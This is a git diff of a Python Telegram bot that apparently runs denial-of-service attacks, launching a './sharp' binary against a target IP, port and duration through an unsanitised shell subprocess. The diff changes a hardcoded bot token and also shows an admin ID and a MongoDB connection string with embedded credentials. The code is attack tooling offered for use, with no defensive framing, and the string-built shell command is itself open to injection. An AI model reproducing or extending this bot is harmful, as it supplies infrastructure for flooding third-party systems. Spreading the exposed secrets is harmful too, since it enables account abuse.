@@ -15,8 +15,8 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 loop = asyncio.get_event_loop()
 
 # Bot Configuration: Set with Authority
-TOKEN = '7670606668:AAEPBT7ft9R-2MrmXeHW-DKVTmwSLUCbTxc'
-ADMIN_USER_ID =5634497189
+TOKEN = '7801121559:AAGq8iGImBUeb_jlrKzM_c5S3PKmEi9FQBE'
+ADMIN_USER_ID = 5634497189
 MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
 USERNAME = "@RICHGUTAM"  # Immutable username for maximum security
 
@@ -68,7 +68,7 @@ async def run_attack_command_async(target_ip, target_port, duration):
     global attack_in_progress
     attack_in_progress = True  # Set the flag to indicate an attack is in progress
 
-    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 1000")
+    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration}")
     await process.communicate()
 
     attack_in_progress = False  # Reset the flag after the attack is complete
@@ -245,3 +245,4 @@ if __name__ == "__main__":
             bot.polling(none_stop=True)
         except Exception as e:
             logging.error(f"Polling error: {e}")
+            
